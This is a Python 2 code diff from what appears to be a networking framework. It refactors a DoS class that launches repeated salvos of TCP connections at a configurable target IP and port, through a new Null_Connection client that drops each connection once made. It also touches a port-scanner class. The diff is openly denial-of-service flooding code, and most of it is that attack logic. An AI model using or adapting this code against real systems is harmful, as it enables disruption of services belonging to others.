@@ -6,6 +6,7 @@ from contextlib import contextmanager
 import mpre.base as base
 import mpre.defaults as defaults
 import mpre.vmlibrary as vmlibrary
+import mpre.network as network
 from mpre.utilities import Latency
 Instruction = base.Instruction
 
@@ -36,7 +37,18 @@ def resist_debugging():
     yield
     sys.settrace(None)
 
-
+    
+class Null_Connection(network.Tcp_Client):
+    
+    defaults = defaults.Tcp_Client.copy()
+    
+    def __init__(self, **kwargs):
+        super(Null_Connection, self).__init__(**kwargs)
+        
+    def on_connect(self):
+        self.delete()        
+            
+        
 class DoS(vmlibrary.Process):
 
     defaults = DoS
@@ -44,32 +56,23 @@ class DoS(vmlibrary.Process):
     def __init__(self, **kwargs):
         super(DoS, self).__init__(**kwargs)
         self.latency = Latency(name="Salvo size: %i" % self.salvo_size)
-        
-        self.options = {"on_connect" : self._on_connection,
-                   "target" : self.target,
-                   "ip" : self.ip,
-                   "port" : self.port,
-                   "timeout_notify" : self.timeout_notify,
-                   "bad_target_verbosity" : 'v'}
-        
-    def _on_connection(self, connection):
-        connection.delete()
-        
-    def socket_recv(self, connection):
-        connection.recv(8192)
-
+        Null_Connection.defaults.update({"target" : self.target,
+                                         "ip" : self.ip,
+                                         "port" : self.port,
+                                         "timeout_notify" : self.timeout_notify,
+                                         "bad_target_verbosity" : 'v'})
     def run(self):
-        self.count += 1
         if self.display_progress:
+            self.count += 1
             print "Launched {0} connections".format(self.count * self.salvo_size)
         if self.display_latency:
             latency = self.latency
             #print "launching salvo: {0} connections per second ({1} connections attempted)".format(self.latency.average.meta_average, (self.count * self.salvo_size))
             self.latency.update()
             self.latency.display()
-        options = self.options
+        
         for connection_number in xrange(self.salvo_size):
-            self.create("network.Tcp_Client", **options)
+            self.create(Null_Connection)
 
         self.run_instruction.execute(self.priority)
 
@@ -86,11 +89,6 @@ class Scanner(vmlibrary.Process):
         self.scan_address_alert = functools.partial(self.alert,
                                                     "Beginning scan of {0}:{1}",
                                                     level = "vv")
-        self.options = {"socket_recv" : self._socket_recv,
-                        "on_connect" : self._notify,
-                        "timeout" : self.timeout,
-                        "timeout_notify" : False,
-                        "bad_target_verbosity" : 'v'}
 
         self.create_threads()
 
